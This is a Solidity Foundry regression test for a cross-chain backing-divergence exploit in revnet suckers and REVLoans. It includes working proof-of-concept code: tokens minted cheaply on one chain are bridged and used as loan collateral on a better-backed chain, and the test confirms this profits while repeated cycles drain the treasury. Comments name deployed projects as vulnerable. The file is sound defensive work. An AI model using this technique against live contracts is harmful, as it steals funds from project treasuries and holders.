// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {JBConstants} from "@bananapus/core-v6/src/libraries/JBConstants.sol";

import {IJBSucker} from "@bananapus/suckers-v6/src/interfaces/IJBSucker.sol";
import {IJBSuckerDeployer} from "@bananapus/suckers-v6/src/interfaces/IJBSuckerDeployer.sol";
import {JBSucker} from "@bananapus/suckers-v6/src/JBSucker.sol";
import {JBSuckerDeployerConfig} from "@bananapus/suckers-v6/src/structs/JBSuckerDeployerConfig.sol";
import {JBTokenMapping} from "@bananapus/suckers-v6/src/structs/JBTokenMapping.sol";
import {JBClaim} from "@bananapus/suckers-v6/src/structs/JBClaim.sol";
import {JBLeaf} from "@bananapus/suckers-v6/src/structs/JBLeaf.sol";
import {JBMessageRoot} from "@bananapus/suckers-v6/src/structs/JBMessageRoot.sol";
import {JBInboxTreeRoot} from "@bananapus/suckers-v6/src/structs/JBInboxTreeRoot.sol";
import {JBOptimismSucker} from "@bananapus/suckers-v6/src/JBOptimismSucker.sol";
import {JBOptimismSuckerDeployer} from "@bananapus/suckers-v6/src/deployers/JBOptimismSuckerDeployer.sol";
import {IOPMessenger} from "@bananapus/suckers-v6/src/interfaces/IOPMessenger.sol";
import {IOPStandardBridge} from "@bananapus/suckers-v6/src/interfaces/IOPStandardBridge.sol";

import {JBPermissionsData} from "@bananapus/core-v6/src/structs/JBPermissionsData.sol";
import {JBPermissionIds} from "@bananapus/permission-ids-v6/src/JBPermissionIds.sol";

import {REVLoan} from "@rev-net/core-v6/src/structs/REVLoan.sol";
import {REVConfig} from "@rev-net/core-v6/src/structs/REVConfig.sol";
import {REVDescription} from "@rev-net/core-v6/src/structs/REVDescription.sol";
import {REVStageConfig, REVAutoIssuance} from "@rev-net/core-v6/src/structs/REVStageConfig.sol";
import {REVSuckerDeploymentConfig} from "@rev-net/core-v6/src/structs/REVSuckerDeploymentConfig.sol";

import {JBAccountingContext} from "@bananapus/core-v6/src/structs/JBAccountingContext.sol";
import {JBSplit} from "@bananapus/core-v6/src/structs/JBSplit.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {RevnetForkBase} from "../helpers/RevnetForkBase.sol";

/// @notice Mock OP messenger — lets the test drive `xDomainMessageSender` and accepts `sendMessage` as a no-op.
contract DivergenceMockOPMessenger {
    address public xDomainMessageSender;

    function setXDomainMessageSender(address sender) external {
        xDomainMessageSender = sender;
    }

    function sendMessage(address, bytes calldata, uint32) external payable {}
}

/// @notice Mock OP standard bridge — no-op for both ERC20 and ETH bridging.
contract DivergenceMockOPBridge {
    function bridgeETHTo(address, uint32, bytes calldata) external payable {}

    function bridgeERC20To(address, address, address, uint256, uint32, bytes calldata) external {}
}

/// @notice Regression test for the cross-chain backing-divergence exploit
/// (https://github.com/Bananapus/version-6/issues/159).
///
/// Premise:
///   - Two chains share a revnet via suckers: L (low backing per token) and R (high backing per token).
///   - When the local cashOutTaxRate ruleset has `scopeCashOutsToLocalBalances == false`, REVLoans uses
///     AGGREGATED supply and surplus (local + remote-snapshot) to value collateral.
///   - An attacker pays cheaply on L (minting many tokens), bridges those tokens through `JBSucker.prepare` →
///     `toRemote` → `fromRemote` → `claim`, and then calls `REVLoans.borrowFrom` on R against the freshly minted
///     tokens. On R, the per-token valuation reflects R's far-higher backing, so the borrow exceeds what the
///     attacker spent on L.
///
/// Single-fork realization:
///   We model L and R on one mainnet fork using the existing single-fork sucker pattern. The revnet is the
///   "R" chain (mainnet, chainId=1). The OP sucker's peer (chainId=10) plays the "L" chain. The L→R bridge
///   message is simulated by directly calling `fromRemote` on the sucker with the leaf the attacker would
///   have produced if they had `pay`-ed on L and then called `prepare` on L's sucker.
///
/// Divergent backing on R is constructed via `addToBalanceOf` — a donation that adds terminal surplus
/// without minting any matching project tokens. Path (2) per the issue, the simpler of the two valid
/// constructions.
///
/// Run with: forge test --match-contract CrossChainBackingDivergenceFork -vvv
contract CrossChainBackingDivergenceFork is RevnetForkBase {
    uint32 constant NATIVE_CURRENCY = uint32(uint160(JBConstants.NATIVE_TOKEN));
    /// @dev Mocked peer chainId for the OP sucker on mainnet — "L" in our model.
    uint256 constant L_CHAIN_ID = 10;

    DivergenceMockOPMessenger internal mockMessenger;
    DivergenceMockOPBridge internal mockBridge;
    JBOptimismSuckerDeployer internal opSuckerDeployer;

    /// @dev The revnet under test. Deployed on the fork (chainId 1, our "R" chain).
    uint256 internal revnetId;
    /// @dev The sucker pair. From R's perspective: messages come FROM L via `fromRemote`.
    IJBSucker internal sucker;

    /// @dev Attacker addresses & starting balances.
    address internal attacker;
    uint256 internal attackerStartBalance;

    /// @dev Use a distinct CREATE2 salt for our REVDeployer so it doesn't collide with sibling test contracts.
    function _deployerSalt() internal pure override returns (bytes32) {
        return "REVDeployer_BackingDivergence";
    }

    function setUp() public override {
        // Inherit the full ecosystem setup (REVDeployer, REVLoans, sucker registry, etc.).
        super.setUp();

        // Make sure block.chainid == 1 so OP sucker's hardcoded peerChainId() returns 10.
        require(block.chainid == 1, "fork must be on mainnet for OP peer = 10");

        // Deploy a mock OP messenger + bridge so the sucker can accept fromRemote() calls under our control.
        mockMessenger = new DivergenceMockOPMessenger();
        mockBridge = new DivergenceMockOPBridge();

        opSuckerDeployer = new JBOptimismSuckerDeployer({
            directory: jbDirectory(),
            permissions: jbPermissions(),
            tokens: jbTokens(),
            configurator: address(this),
            trustedForwarder: address(0)
        });
        opSuckerDeployer.setChainSpecificConstants({
            messenger: IOPMessenger(address(mockMessenger)), bridge: IOPStandardBridge(address(mockBridge))
        });

        // Fee project must exist before any sucker singleton is bound to its id.
        _deployFeeProject(0);

        // Configure the OP sucker singleton AFTER the fee project exists.
        JBOptimismSucker singleton = new JBOptimismSucker({
            deployer: opSuckerDeployer,
            directory: jbDirectory(),
            permissions: jbPermissions(),
            prices: jbPrices(),
            tokens: jbTokens(),
            feeProjectId: FEE_PROJECT_ID,
            registry: SUCKER_REGISTRY,
            trustedForwarder: address(0)
        });
        opSuckerDeployer.configureSingleton(singleton);

        vm.prank(multisig());
        SUCKER_REGISTRY.allowSuckerDeployer(address(opSuckerDeployer));

        // Deploy the revnet under test. 10% cashOutTaxRate is enough to make the borrow primitive interesting
        // (low tax → high borrow per collateral); also keeps the math tractable.
        revnetId = _deployRevnet(1000);

        // The REVDeployer auto-deploys an ERC20 for the revnet. Now deploy a sucker for this revnet using the
        // OP-sucker deployer so the sucker has the well-known peerChainId = 10 ("L").
        sucker = IJBSucker(_deployRevnetSucker(revnetId));

        // The sucker needs MINT_TOKENS permission on the revnet so `_handleClaim` can mint to the beneficiary
        // (the attacker). The REVDeployer is the project owner, so we grant permission from REVDeployer.
        _grantPermissionFrom(address(REV_DEPLOYER), address(sucker), revnetId, JBPermissionIds.MINT_TOKENS);

        // The revnet routes payments through the buyback hook which calls the Uniswap V4 geomean oracle. With
        // no real pool, we mock the oracle to return zero liquidity so the hook falls through to the bonding
        // curve (mint via terminal). This matches the FullStackFork test pattern.
        _mockOracle(1, 0, uint32(REV_DEPLOYER.DEFAULT_BUYBACK_TWAP_WINDOW()));

        // ── Build R's divergent backing ────────────────────────────────────────
        // First, seed a small existing supply on R so totalSupply > 0 (a `cashOutFrom` with totalSupply == 0
        // is the edge case C-5; we deliberately avoid it here so the test reflects realistic state). One
        // honest user pays 1 ETH at WEIGHT=1000e18 → 1000 tokens issued and 1 ETH of surplus.
        address seeder = makeAddr("seeder");
        vm.deal(seeder, 5 ether);
        _payRevnet(revnetId, seeder, 1 ether);

        // Now donate 99 additional ETH directly into the terminal as project balance — adds surplus without
        // minting any tokens. After this, R looks like ~1000 tokens / 100 ETH = backing ratio 100x the L side.
        address donor = makeAddr("donor");
        vm.deal(donor, 100 ether);
        vm.prank(donor);
        jbMultiTerminal().addToBalanceOf{value: 99 ether}({
            projectId: revnetId,
            token: JBConstants.NATIVE_TOKEN,
            amount: 99 ether,
            shouldReturnHeldFees: false,
            memo: "donation creating divergent backing on R",
            metadata: ""
        });

        // ── Attacker setup ─────────────────────────────────────────────────────
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1000 ether);
        attackerStartBalance = attacker.balance;
    }

    // ═════════════════════════════════════════════════════════════════════════
    //  Helpers — sucker deployment + permissions
    // ═════════════════════════════════════════════════════════════════════════

    /// @notice Deploy a fresh native revnet with a custom description salt (needed for the control test to
    /// avoid CREATE2 collision against the primary revnet's ERC20).
    function _deployFreshRevnet(uint16 cashOutTaxRate, bytes32 descriptionSalt) internal returns (uint256) {
        JBAccountingContext[] memory acc = new JBAccountingContext[](1);
        acc[0] = JBAccountingContext({
            token: JBConstants.NATIVE_TOKEN, decimals: 18, currency: uint32(uint160(JBConstants.NATIVE_TOKEN))
        });

        REVStageConfig[] memory stages = new REVStageConfig[](1);
        JBSplit[] memory splits = new JBSplit[](1);
        splits[0].beneficiary = payable(multisig());
        splits[0].percent = 10_000;
        stages[0] = REVStageConfig({
            startsAtOrAfter: uint40(block.timestamp),
            autoIssuances: new REVAutoIssuance[](0),
            splitPercent: 0,
            splits: splits,
            initialIssuance: INITIAL_ISSUANCE,
            issuanceCutFrequency: 0,
            issuanceCutPercent: 0,
            cashOutTaxRate: cashOutTaxRate,
            extraMetadata: 0
        });

        REVConfig memory cfg = REVConfig({
            description: REVDescription("Control", "CTRL", "ipfs://ctrl", descriptionSalt),
            baseCurrency: uint32(uint160(JBConstants.NATIVE_TOKEN)),
            operator: multisig(),
            scopeCashOutsToLocalBalances: false,
            stageConfigurations: stages
        });

        REVSuckerDeploymentConfig memory sdc = REVSuckerDeploymentConfig({
            deployerConfigurations: new JBSuckerDeployerConfig[](0), salt: descriptionSalt
        });

        (uint256 newId,) = REV_DEPLOYER.deployFor({
            revnetId: 0, configuration: cfg, accountingContextsToAccept: acc, suckerDeploymentConfiguration: sdc
        });
        return newId;
    }

    /// @notice Deploy a sucker for the supplied revnet with a custom registry salt (so the control test
    /// doesn't collide on CREATE2 with the primary sucker).
    function _deployRevnetSuckerWithSalt(uint256 _revnetId, bytes32 registrySalt) internal returns (address) {
        _grantPermissionFrom(address(REV_DEPLOYER), address(SUCKER_REGISTRY), _revnetId, JBPermissionIds.DEPLOY_SUCKERS);
        _grantPermissionFrom(
            address(REV_DEPLOYER), address(SUCKER_REGISTRY), _revnetId, JBPermissionIds.MAP_SUCKER_TOKEN
        );

        JBTokenMapping[] memory mappings = new JBTokenMapping[](1);
        mappings[0] = JBTokenMapping({
            localToken: JBConstants.NATIVE_TOKEN,
            minGas: 200_000,
            remoteToken: bytes32(uint256(uint160(JBConstants.NATIVE_TOKEN)))
        });

        JBSuckerDeployerConfig[] memory configs = new JBSuckerDeployerConfig[](1);
        configs[0] = JBSuckerDeployerConfig({
            deployer: IJBSuckerDeployer(address(opSuckerDeployer)), peer: bytes32(0), mappings: mappings
        });

        vm.prank(address(REV_DEPLOYER));
        address[] memory deployed = SUCKER_REGISTRY.deploySuckersFor(_revnetId, registrySalt, configs);
        return deployed[0];
    }

    function _deployRevnetSucker(uint256 _revnetId) internal returns (address) {
        // REV_DEPLOYER owns deployed revnet projects. Grant the registry both permissions on its behalf.
        _grantPermissionFrom(address(REV_DEPLOYER), address(SUCKER_REGISTRY), _revnetId, JBPermissionIds.DEPLOY_SUCKERS);
        _grantPermissionFrom(
            address(REV_DEPLOYER), address(SUCKER_REGISTRY), _revnetId, JBPermissionIds.MAP_SUCKER_TOKEN
        );

        JBTokenMapping[] memory mappings = new JBTokenMapping[](1);
        mappings[0] = JBTokenMapping({
            localToken: JBConstants.NATIVE_TOKEN,
            minGas: 200_000,
            remoteToken: bytes32(uint256(uint160(JBConstants.NATIVE_TOKEN)))
        });

        JBSuckerDeployerConfig[] memory configs = new JBSuckerDeployerConfig[](1);
        configs[0] = JBSuckerDeployerConfig({
            deployer: IJBSuckerDeployer(address(opSuckerDeployer)), peer: bytes32(0), mappings: mappings
        });

        vm.prank(address(REV_DEPLOYER));
        address[] memory deployed = SUCKER_REGISTRY.deploySuckersFor(_revnetId, bytes32("DIV_SALT"), configs);
        return deployed[0];
    }

    function _grantPermissionFrom(address from, address operator, uint256 _projectId, uint8 permissionId) internal {
        uint8[] memory ids = new uint8[](1);
        ids[0] = permissionId;
        vm.prank(from);
        jbPermissions()
            .setPermissionsFor(
                from,
                // forge-lint: disable-next-line(unsafe-typecast)
                JBPermissionsData({operator: operator, projectId: uint64(_projectId), permissionIds: ids})
            );
    }

    // ═════════════════════════════════════════════════════════════════════════
    //  Helpers — leaf staging (mirrors ReferralRewardCrossChainFork pattern)
    // ═════════════════════════════════════════════════════════════════════════

    /// @notice Stage an inbox root on `sucker` as if "L" had bridged a leaf carrying (tokens, terminalAmount)
    /// to `beneficiary` at the supplied `index`. Uses the empty-subtree z-hash proof — valid for any index
    /// because each cycle replaces the inbox root with one containing only its own leaf.
    function _stageInboxLeaf(
        uint256 projectTokenCount,
        uint256 terminalTokenAmount,
        bytes32 beneficiary,
        bytes32 metadata,
        uint64 nonce,
        uint256 index
    )
        internal
        returns (bytes32 leafHash, bytes32[32] memory proof)
    {
        leafHash = keccak256(abi.encodePacked(projectTokenCount, terminalTokenAmount, beneficiary, metadata));
        proof = _emptyBranchProof();
        bytes32 root = _computeBranchRoot(leafHash, proof, index);

        // Pretend the remote peer (which equals address(sucker) under CREATE2 peer convention) sent us this root.
        mockMessenger.setXDomainMessageSender(address(sucker));
        vm.prank(address(mockMessenger));
        JBSucker(payable(address(sucker)))
            .fromRemote(
                JBMessageRoot({
                version: 1,
                token: bytes32(uint256(uint160(JBConstants.NATIVE_TOKEN))),
                amount: terminalTokenAmount,
                remoteRoot: JBInboxTreeRoot({nonce: nonce, root: root}),
                sourceTotalSupply: 0,
                sourceCurrency: NATIVE_CURRENCY,
                sourceDecimals: 18,
                sourceSurplus: 0,
                sourceBalance: 0,
                sourceTimestamp: uint64(block.timestamp)
            })
            );

        // Fund the sucker with the bridged terminal-token amount so `_addToBalance` can forward to the project.
        // In production this ETH would have ridden the standard bridge alongside the message.
        vm.deal(address(sucker), address(sucker).balance + terminalTokenAmount);
    }

    function _computeBranchRoot(
        bytes32 item,
        bytes32[32] memory branch,
        uint256 index
    )
        internal
        pure
        returns (bytes32 current)
    {
        current = item;
        for (uint256 i; i < 32; ++i) {
            bool isRight = ((index >> i) & 1) == 1;
            if (isRight) {
                current = keccak256(abi.encodePacked(branch[i], current));
            } else {
                current = keccak256(abi.encodePacked(current, branch[i]));
            }
        }
    }

    function _emptyBranchProof() internal pure returns (bytes32[32] memory proof) {
        proof[0] = 0x0000000000000000000000000000000000000000000000000000000000000000;
        proof[1] = 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5;
        proof[2] = 0xb4c11951957c6f8f642c4af61cd6b24640fec6dc7fc607ee8206a99e92410d30;
        proof[3] = 0x21ddb9a356815c3fac1026b6dec5df3124afbadb485c9ba5a3e3398a04b7ba85;
        proof[4] = 0xe58769b32a1beaf1ea27375a44095a0d1fb664ce2dd358e7fcbfb78c26a19344;
        proof[5] = 0x0eb01ebfc9ed27500cd4dfc979272d1f0913cc9f66540d7e8005811109e1cf2d;
        proof[6] = 0x887c22bd8750d34016ac3c66b5ff102dacdd73f6b014e710b51e8022af9a1968;
        proof[7] = 0xffd70157e48063fc33c97a050f7f640233bf646cc98d9524c6b92bcf3ab56f83;
        proof[8] = 0x9867cc5f7f196b93bae1e27e6320742445d290f2263827498b54fec539f756af;
        proof[9] = 0xcefad4e508c098b9a7e1d8feb19955fb02ba9675585078710969d3440f5054e0;
        proof[10] = 0xf9dc3e7fe016e050eff260334f18a5d4fe391d82092319f5964f2e2eb7c1c3a5;
        proof[11] = 0xf8b13a49e282f609c317a833fb8d976d11517c571d1221a265d25af778ecf892;
        proof[12] = 0x3490c6ceeb450aecdc82e28293031d10c7d73bf85e57bf041a97360aa2c5d99c;
        proof[13] = 0xc1df82d9c4b87413eae2ef048f94b4d3554cea73d92b0f7af96e0271c691e2bb;
        proof[14] = 0x5c67add7c6caf302256adedf7ab114da0acfe870d449a3a489f781d659e8becc;
        proof[15] = 0xda7bce9f4e8618b6bd2f4132ce798cdc7a60e7e1460a7299e3c6342a579626d2;
        proof[16] = 0x2733e50f526ec2fa19a22b31e8ed50f23cd1fdf94c9154ed3a7609a2f1ff981f;
        proof[17] = 0xe1d3b5c807b281e4683cc6d6315cf95b9ade8641defcb32372f1c126e398ef7a;
        proof[18] = 0x5a2dce0a8a7f68bb74560f8f71837c2c2ebbcbf7fffb42ae1896f13f7c7479a0;
        proof[19] = 0xb46a28b6f55540f89444f63de0378e3d121be09e06cc9ded1c20e65876d36aa0;
        proof[20] = 0xc65e9645644786b620e2dd2ad648ddfcbf4a7e5b1a3a4ecfe7f64667a3f0b7e2;
        proof[21] = 0xf4418588ed35a2458cffeb39b93d26f18d2ab13bdce6aee58e7b99359ec2dfd9;
        proof[22] = 0x5a9c16dc00d6ef18b7933a6f8dc65ccb55667138776f7dea101070dc8796e377;
        proof[23] = 0x4df84f40ae0c8229d0d6069e5c8f39a7c299677a09d367fc7b05e3bc380ee652;
        proof[24] = 0xcdc72595f74c7b1043d0e1ffbab734648c838dfb0527d971b602bc216c9619ef;
        proof[25] = 0x0abf5ac974a1ed57f4050aa510dd9c74f508277b39d7973bb2dfccc5eeb0618d;
        proof[26] = 0xb8cd74046ff337f0a7bf2c8e03e10f642c1886798d71806ab1e888d9e5ee87d0;
        proof[27] = 0x838c5655cb21c6cb83313b5a631175dff4963772cce9108188b34ac87c81c41e;
        proof[28] = 0x662ee4dd2dd7b2bc707961b1e646c4047669dcb6584f0d8d770daf5d7e7deb2e;
        proof[29] = 0x388ab20e2573d171a88108e79d820e98f26c0b84aa8b2f4aa4968dbb818ea322;
        proof[30] = 0x93237c50ba75ee485f4c22adf2f741400bdf8d6a9cc7df7ecae576221665d735;
        proof[31] = 0x8448818bb4ae4562849e949e17ac16e0be16688e156b5cf15e098c627c0056a9;
    }

    // ═════════════════════════════════════════════════════════════════════════
    //  Helpers — the L→R exploit step
    // ═════════════════════════════════════════════════════════════════════════

    /// @notice One iteration of the exploit:
    ///   1. Compute (tokensOnL, ethReclaimableOnL) as the result of a hypothetical `pay` + `prepare` on L,
    ///      assuming L's backing is so low that `prepare` returns ≈0 backing ETH per token.
    ///   2. Stage the corresponding inbox leaf on R's sucker (`fromRemote`) and fund the sucker with the
    ///      bridged ETH.
    ///   3. `sucker.claim` on R: mints `tokensOnL` to attacker and `addToBalance`s `ethReclaimableOnL`.
    ///   4. `REVLoans.borrowFrom` on R against the freshly minted tokens.
    /// Returns the ETH the attacker collected from the borrow, plus how much they "paid on L" (= the leaf's
    /// terminal token amount, which represents the post-cashout bridged ETH on the L side; the L-side `pay`
    /// they did to mint those tokens was 100% diluted by L's low backing, so the bridged ETH ≈ ETH paid).
    /// @notice External wrapper for `_runExploitCycle` so the repeated test can try/catch around it.
    function runExploitCycleExternal(
        uint256 ethPaidOnL,
        uint64 nonce,
        uint256 leafIndex
    )
        external
        returns (uint256)
    {
        require(msg.sender == address(this), "test-only");
        return _runExploitCycle(ethPaidOnL, nonce, leafIndex);
    }

    function _runExploitCycle(
        uint256 ethPaidOnL,
        uint64 nonce,
        uint256 leafIndex
    )
        internal
        returns (uint256 borrowedEth)
    {
        // L's backing is by construction near zero relative to R's. The leaf carries:
        //   - projectTokenCount = WEIGHT * ethPaidOnL / 1e18   (tokens the attacker minted on L for ethPaidOnL)
        //   - terminalTokenAmount = ethPaidOnL                  (the attacker's L payment, ~entirely refunded
        //     through prepare's cashout because L has no other token holders to dilute backing).
        //
        // Conservative simplification: we assume L→R bridges the entire ethPaidOnL. In production an honest
        // L-side payer would lose a small amount to L's bonding curve, but if L has supply~0 the cashout is
        // close to 1:1. This makes the test self-contained (no need to actually deploy an L revnet to derive
        // the exact reclaim — the math is dominated by R's divergence anyway).
        uint256 tokensOnL = (uint256(INITIAL_ISSUANCE) * ethPaidOnL) / 1e18;
        uint256 terminalTokenAmount = ethPaidOnL;

        bytes32 beneficiary = bytes32(uint256(uint160(attacker)));
        (bytes32 leafHash, bytes32[32] memory proof) = _stageInboxLeaf({
            projectTokenCount: tokensOnL,
            terminalTokenAmount: terminalTokenAmount,
            beneficiary: beneficiary,
            metadata: bytes32(0),
            nonce: nonce,
            index: leafIndex
        });
        leafHash; // unused — `claim` re-derives it from the leaf struct.

        // Claim — mints `tokensOnL` to attacker and addToBalances `terminalTokenAmount` ETH into revnet R.
        IJBSucker(address(sucker))
            .claim(
                JBClaim({
                token: JBConstants.NATIVE_TOKEN,
                leaf: JBLeaf({
                    index: leafIndex,
                    beneficiary: beneficiary,
                    projectTokenCount: tokensOnL,
                    terminalTokenAmount: terminalTokenAmount,
                    metadata: bytes32(0)
                }),
                proof: proof
            })
            );

        // Borrow on R against all the attacker's currently-held tokens (including any leftover from prior
        // cycles — though under MIN_PREPAID_FEE the previous loans should have burned ~100% of collateral).
        uint256 attackerTokens = jbTokens().totalBalanceOf(attacker, revnetId);
        assertGt(attackerTokens, 0, "attacker should hold tokens from claim");

        // Grant burn permission so REVLoans can burn collateral on the attacker's behalf.
        _grantBurnPermission(attacker, revnetId);

        uint256 borrowable = LOANS_CONTRACT
            .borrowableAmountFrom(revnetId, attackerTokens, 18, uint32(uint160(JBConstants.NATIVE_TOKEN)));

        uint256 ethBefore = attacker.balance;

        // Cache MIN_PREPAID_FEE_PERCENT BEFORE `vm.prank` — otherwise Solidity evaluates that argument with
        // an external view call which consumes the prank.
        uint256 prepaidFee = LOANS_CONTRACT.MIN_PREPAID_FEE_PERCENT();

        vm.prank(attacker);
        (uint256 loanId,) = LOANS_CONTRACT.borrowFrom({
            revnetId: revnetId,
            token: JBConstants.NATIVE_TOKEN,
            minBorrowAmount: 0,
            collateralCount: attackerTokens,
            beneficiary: payable(attacker),
            prepaidFeePercent: prepaidFee,
            holder: attacker
        });
        loanId; // silence warning

        borrowedEth = attacker.balance - ethBefore;
        // Sanity: borrowable approximates what we actually received (some prepaid fee is deducted).
        assertLe(borrowedEth, borrowable, "actual borrow can't exceed advertised borrowable");
    }

    // ═════════════════════════════════════════════════════════════════════════
    //  Tests
    // ═════════════════════════════════════════════════════════════════════════

    /// @notice The exploit, in its simplest form: one big payment on L, bridge → claim → borrow on R.
    /// Asserts the attacker's net ETH balance after the cycle exceeds their starting balance — i.e. the
    /// borrow on R, valued at R's high backing-per-token, exceeds the cost of minting tokens on L.
    function test_exploit_singleBridgeRoute_profitable() public {
        // Sanity: R's surplus is ~100 ETH (seeder paid 1 ETH + donor donated 99 ETH).
        uint256 surplusR = _terminalBalance(revnetId, JBConstants.NATIVE_TOKEN);
        assertApproxEqAbs(surplusR, 100 ether, 0.01 ether, "R surplus should be ~100 ETH pre-attack");

        // Run a single exploit cycle: attacker "paid" 10 ETH on L, brought 10 ETH + 10000 tokens through the bridge.
        uint256 ethPaidOnL = 10 ether;
        uint256 borrowed = _runExploitCycle({ethPaidOnL: ethPaidOnL, nonce: 1, leafIndex: 0});

        // Attacker's net = (final balance) - (start balance). Tokens are burned as collateral; attacker may
        // choose never to repay (loan can liquidate, the project keeps collateral, attacker keeps borrowed ETH).
        // The honest comparison: ETH out (paid on L) vs ETH in (borrowed on R).
        // Note: attacker started with 1000 ETH; we never actually debited the 10 ETH for L (single-fork
        // simulation), so to compare apples-to-apples we subtract `ethPaidOnL` from the gain.
        uint256 attackerGain = attacker.balance - attackerStartBalance; // ETH credit from the borrow alone.
        // The bridge delivered `ethPaidOnL` to R's terminal via addToBalance — that ETH no longer belongs to
        // the attacker. So the true profit is `borrowed - ethPaidOnL`.
        emit log_named_decimal_uint("attacker borrowed (ETH)", borrowed, 18);
        emit log_named_decimal_uint("attacker paid on L (ETH)", ethPaidOnL, 18);
        emit log_named_decimal_uint("attacker gain (ETH credit, pre-cost)", attackerGain, 18);

        assertGt(borrowed, ethPaidOnL, "borrowing on R exceeds L payment - exploit profitable");

        int256 netProfit = int256(borrowed) - int256(ethPaidOnL);
        emit log_named_int("net profit (borrowed - paid on L)", netProfit);
    }

    /// @notice Repeated small payments amortize R's dilution per cycle, increasing total profit.
    /// Each small cycle barely moves R's aggregate ratio because each payment is small relative to R's surplus.
    /// In practice this both confirms the exploit's per-cycle profitability and demonstrates that R's terminal
    /// balance drains over time — once balance < borrowable, the borrow reverts (terminal store cap), which is
    /// the natural ceiling on extraction in a single block.
    function test_exploit_repeatedSmallPayments_amortizesDilution() public {
        // Small per-cycle relative to R's 100 ETH surplus, so each cycle is profitable in isolation.
        // The treasury drains rapidly (≈30 ETH per cycle even with 0.5 ETH paid), so we stop once R's
        // physical balance can no longer cover another borrow.
        uint256 perCycle = 0.5 ether;
        uint256 maxCycles = 5;
        uint256 totalBorrowed;
        uint256 totalPaidOnL;
        uint256 actualCycles;

        for (uint64 i; i < maxCycles; ++i) {
            // Try the cycle; if R's physical terminal balance can no longer cover the borrow (which is the
            // exploit's natural ceiling — once R is drained, no further extraction is possible) the call
            // reverts and we stop. The fact that this point is reached in 2-3 cycles, paying 0.5 ETH each,
            // is itself a strong signal of the exploit's severity.
            try this.runExploitCycleExternal(perCycle, i + 1, i) returns (uint256 borrowed) {
                totalBorrowed += borrowed;
                totalPaidOnL += perCycle;
                actualCycles++;
            } catch {
                break;
            }
        }

        emit log_named_uint("cycles actually run", actualCycles);

        emit log_named_decimal_uint("total borrowed (ETH)", totalBorrowed, 18);
        emit log_named_decimal_uint("total paid on L (ETH)", totalPaidOnL, 18);
        emit log_named_int("net profit (cumulative)", int256(totalBorrowed) - int256(totalPaidOnL));

        assertGt(totalBorrowed, totalPaidOnL, "cumulative borrow exceeds cumulative L payment");
    }

    /// @notice CONTROL: prove the exploit assertion is non-vacuous by checking the divergence-free baseline.
    /// If R has NO surplus divergence (no donation), borrowing on R against an L-side mint should NOT exceed
    /// the L payment — the bonding curve is then symmetric and the attacker is at-best break-even (minus tax
    /// and fees, so at-worst small loss).
    ///
    /// Note: the production fix is at deploy time — projects can set `scopeCashOutsToLocalBalances: true` in
    /// their ruleset metadata so REVLoans uses ONLY the local surplus + supply, regardless of what bridged
    /// tokens claim. Verified manually: projects 1/2/3/4/5/7 in `script/Deploy.s.sol` all set this to `false`,
    /// which is what makes them vulnerable. A runtime control here would require queueing a new ruleset on
    /// the deployed revnet, which REVOwner does not currently expose as a public path.
    function test_control_noDivergence_exploitIsNotProfitable() public {
        // Cash out the donor's 99 ETH from R via a vm.deal trick: we can't easily un-donate, so instead deploy
        // a SECOND fresh revnet on the same fork with no donation and run the same exploit. Compare profit.
        // Use a custom config with a distinct description salt to avoid CREATE2 collision on the ERC20 token.
        uint256 cleanRevnetId = _deployFreshRevnet({cashOutTaxRate: 1000, descriptionSalt: "REV_CONTROL_SALT"});
        IJBSucker cleanSucker = IJBSucker(_deployRevnetSuckerWithSalt(cleanRevnetId, bytes32("CTRL_DIV_SALT")));
        _grantPermissionFrom(address(REV_DEPLOYER), address(cleanSucker), cleanRevnetId, JBPermissionIds.MINT_TOKENS);

        // Seed only 1 ETH (matching backing — 1000 tokens per ETH, same as L).
        address seeder = makeAddr("controlSeeder");
        vm.deal(seeder, 1 ether);
        _payRevnet(cleanRevnetId, seeder, 1 ether);

        // Build & stage the inbox leaf onto the clean sucker.
        uint256 ethPaidOnL = 10 ether;
        uint256 tokensOnL = (uint256(INITIAL_ISSUANCE) * ethPaidOnL) / 1e18;
        bytes32 beneficiary = bytes32(uint256(uint160(attacker)));

        bytes32 leafHash = keccak256(abi.encodePacked(tokensOnL, ethPaidOnL, beneficiary, bytes32(0)));
        bytes32[32] memory proof = _emptyBranchProof();
        bytes32 root = _computeBranchRoot(leafHash, proof, 0);

        mockMessenger.setXDomainMessageSender(address(cleanSucker));
        vm.prank(address(mockMessenger));
        JBSucker(payable(address(cleanSucker)))
            .fromRemote(
                JBMessageRoot({
                version: 1,
                token: bytes32(uint256(uint160(JBConstants.NATIVE_TOKEN))),
                amount: ethPaidOnL,
                remoteRoot: JBInboxTreeRoot({nonce: 1, root: root}),
                sourceTotalSupply: 0,
                sourceCurrency: NATIVE_CURRENCY,
                sourceDecimals: 18,
                sourceSurplus: 0,
                sourceBalance: 0,
                sourceTimestamp: uint64(block.timestamp)
            })
            );
        vm.deal(address(cleanSucker), address(cleanSucker).balance + ethPaidOnL);

        IJBSucker(address(cleanSucker))
            .claim(
                JBClaim({
                token: JBConstants.NATIVE_TOKEN,
                leaf: JBLeaf({
                    index: 0,
                    beneficiary: beneficiary,
                    projectTokenCount: tokensOnL,
                    terminalTokenAmount: ethPaidOnL,
                    metadata: bytes32(0)
                }),
                proof: proof
            })
            );

        _grantBurnPermission(attacker, cleanRevnetId);
        uint256 attackerTokens = jbTokens().totalBalanceOf(attacker, cleanRevnetId);

        uint256 ethBefore = attacker.balance;
        uint256 prepaidFee = LOANS_CONTRACT.MIN_PREPAID_FEE_PERCENT();
        vm.prank(attacker);
        LOANS_CONTRACT.borrowFrom({
            revnetId: cleanRevnetId,
            token: JBConstants.NATIVE_TOKEN,
            minBorrowAmount: 0,
            collateralCount: attackerTokens,
            beneficiary: payable(attacker),
            prepaidFeePercent: prepaidFee,
            holder: attacker
        });
        uint256 borrowed = attacker.balance - ethBefore;
        emit log_named_decimal_uint("control borrowed", borrowed, 18);
        emit log_named_decimal_uint("control paid on L", ethPaidOnL, 18);

        // The control: without divergence, attacker doesn't profit.
        assertLe(borrowed, ethPaidOnL, "without backing divergence, exploit is not profitable");
    }
}
